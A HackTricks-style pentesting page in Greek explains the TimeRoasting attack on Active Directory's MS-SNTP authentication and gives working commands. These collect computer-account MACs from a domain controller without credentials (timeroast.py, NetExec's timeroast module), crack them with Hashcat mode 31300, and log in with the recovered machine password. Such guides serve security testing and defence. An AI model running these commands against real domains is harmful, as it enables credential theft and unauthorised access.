# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

Το TimeRoasting εκμεταλλεύεται τον legacy authentication του MS-SNTP. Ένας unauthenticated client μπορεί να στείλει ένα request 68-byte που περιέχει ένα επιλεγμένο computer-account RID. Για το exploitable legacy path, ο domain controller παράγει το response authenticator μέσω Netlogon, χρησιμοποιώντας το NT hash του computer account (το password secret που προκύπτει από MD4), παρέχοντας στον attacker ένα challenge/MAC pair κατάλληλο για offline password guessing (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Οι ενότητες 3.1.5.1 και 4 του MS-SNTP περιγράφουν τη συμπεριφορά των request και response:<sup>[[1]](#references)</sup>
![TimeRoasting: Δείτε τις ενότητες 3.1.5.1 "Authentication Request Behavior" και 4 "Protocol Examples" στην επίσημη προδιαγραφή του MS-SNTP για λεπτομέρειες](../../images/Pasted%20image%2020250709114508.png)
Όταν το `ExtendedAuthenticatorSupported` είναι false, το request αποθηκεύει το RID στα low 31 bits του Key Identifier του authenticator και ένα selector bit στο high bit. Ο server επαληθεύει το μήκος των 68-byte, εξάγει το RID, ζητά από το Netlogon να υπολογίσει τα candidate checksums, επιλέγει ένα χρησιμοποιώντας αυτό το high bit, μηδενίζει το response Key Identifier και επιστρέφει το επιλεγμένο checksum.<sup>[[1]](#references)</sup>

Το crypto-checksum βασίζεται στο MD5 (βλ. 3.2.5.1.1) και μπορεί να γίνει crack offline, επιτρέποντας την επίθεση roasting.<sup>[[1]](#references)</sup>

## Πώς να επιτεθείτε

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts από τον Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Πρακτική επίθεση (unauth) με NetExec + Hashcat

- Το module `timeroast` του NetExec μπορεί να απαριθμήσει computer RIDs, να συλλέξει MS-SNTP MACs χωρίς authentication και να εμφανίσει hashes `$sntp-ms$` έτοιμα για cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline με Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Το ανακτημένο cleartext αντιστοιχεί σε κωδικό πρόσβασης λογαριασμού υπολογιστή. Δοκιμάστε τον απευθείας ως λογαριασμό μηχανήματος χρησιμοποιώντας Kerberos (-k) όταν το NTLM είναι απενεργοποιημένο:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Επιχειρησιακές σημειώσεις
- Βεβαιωθείτε για την ακρίβεια της ώρας πριν χρησιμοποιήσετε τα ανακτημένα διαπιστευτήρια με το Kerberos. Προτιμήστε έναν συντηρούμενο NTP client, όπως το `chronyd`/`systemd-timesyncd`. Το `ntpdate` διατηρείται εδώ ως συνηθισμένη εντολή lab: `sudo ntpdate <dc_fqdn>`.
- Εάν χρειάζεται, δημιουργήστε το krb5.conf για το AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Αντιστοιχίστε αργότερα τα RIDs με principals μέσω LDAP/BloodHound, μόλις αποκτήσετε οποιοδήποτε authenticated foothold.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — `timeroast` module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
